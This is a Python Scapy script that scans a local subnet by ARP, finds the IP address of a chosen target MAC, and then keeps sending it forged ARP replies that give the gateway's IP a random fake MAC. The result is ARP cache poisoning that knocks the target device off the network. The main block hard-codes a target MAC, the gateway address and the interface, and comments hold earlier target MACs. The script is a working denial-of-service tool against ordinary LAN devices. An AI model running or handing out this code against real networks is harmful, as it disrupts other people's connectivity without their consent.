#! /usr/bin/env python

from scapy.all import *
import time
import random
import os

def GetSubNet(OurIP):
    Index,SubString = 0,""
    while True:
        num = OurIP.find('.',Index)
        if num != -1 : Index = num + 1
        else : SubString = OurIP[:Index];break
    return SubString

def GetMac(tgtIP,Retry=4):
    cnt = 0
    try:
        while cnt < Retry:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac is None:print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
            else:return tgtMac
    except:
        print("Get Mac of %s failed..."%tgtIP)
        return None

def GetBrocastIP(OurIP):return GetSubNet(OurIP) + "255"

def GetForgedIP(OurIP,Num):
    SubString = GetSubNet(OurIP)

    ForgedIP,i = [],0
    while i < Num:
        num = int(random.uniform(0,255));TempIP = SubString + "%d"%num
        if TempIP == OurIP:continue
        else:ForgedIP.append(TempIP);i += 1
    return ForgedIP

def GetForgedMac(OurMac,Num):
    ForgedMac,j = [],0
    while j < Num:
        while True:
            i,TempMac = 0,""
            while i < 6:
                num = random.randrange(0,256,1)
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                i += 1
            #Almost impossible that a forged MAC is our own.
            if TempMac == OurMac:pass
            else:ForgedMac.append(TempMac);j += 1;break
    return ForgedMac

Table = {}
def ScanfByArp(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = True):
    if ClearAtFirst is True : Table.clear()
    SubString = GetSubNet(OurIP)
    ip = []
    for num in range(Start,End+1):ip.append(SubString+str(num))
    ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
    def GetArpResult(r):
        Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
        return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
    g = lambda(s,r):GetArpResult(r)
    ans.summary(g)

def GetIpByMacWithRetry(Mac,Retry=4,Delay=4):
    for i in range(0,Retry + 1):
        time.sleep(i*Delay)
        ScanfByArp(Start=100,End=150,TimeOut=5,ClearAtFirst=True)
        Res = Table.get(Mac)
        if Res is not None:return Res
    else:print("Can not get ip of <%s>"%Mac);return None

def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
    
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    if MY_ip is None or MY_mac == None:return
    print("%s -> %s"%(MY_ip,MY_mac))
    
    BctIP = GetBrocastIP(MY_ip)
    Bct_mac = "FF:FF:FF:FF:FF:FF"
    print("%s -> %s"%(BctIP,Bct_mac))
    
    GW_ip = GWIP
    GW_mac = GetMac(GW_ip)
    if GW_mac is None:return
    print("%s -> %s"%(GW_ip,GW_mac))
    
    #XM_mac = "c8:3a:35:c0:05:15"
    #XM_mac = "24:09:95:95:e2:02"
    #XM_mac = "04:e6:76:46:a6:f3"
    XM_mac = MAC
    XM_ip = GetIpByMacWithRetry(XM_mac,4,4)
    if XM_ip is None:return
    print("%s -> %s"%(XM_ip,XM_mac))
    cnt = 0
    while True:
        Temp_mac = GetForgedMac(MY_mac,PackNum)
        Temp_ip = GetForgedIP(MY_ip,PackNum)
        PKT = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
        try:sendp(PKT,iface = Face);cnt += 1
        except:print("!!Send Error!!")
        print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
        time.sleep(Interval)
        if Counter == -1:pass
        else:
            if cnt >= Counter:return

def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
    '''
    GWIP:your gateway's ip
    Interface:the network interface you want to use
    Delay:
    '''
    if IsWifiWorkWell(GWIP) is False:
        print("Will restart the interface <%s>"%Interface)
        os.system("ifconfig %s down"%Interface)
        time.sleep(Delay)
        os.system("ifconfig %s up"%Interface)
        time.sleep(Delay)
        os.system('sudo /etc/init.d/networking restart')
        time.sleep(Delay)
        print("Network restart finished...")
        return True
    else:return False
def IsWifiWorkWell(GWIP = "192.168.0.1"):
    '''
    To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
    '''
    if GetMac(GWIP) is None:return False
    else:return True
if __name__ == "__main__":
    #while True:
    #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
    #AttackMac(Mac,face,Num,Interval,GW_IP):
    #AttackMac("C8:3A:35:C0:05:15","wlan0",2,2,"192.168.0.108")
    #num=0
    #while num < 0:
    #    num = num + 1
    #    time.sleep(60)
    #    print(num)
    while True:
        EnsureWifiConnection()
        Attack_MAC("ens33","192.168.0.1","04:e6:76:46:a6:f3",60,300,1)
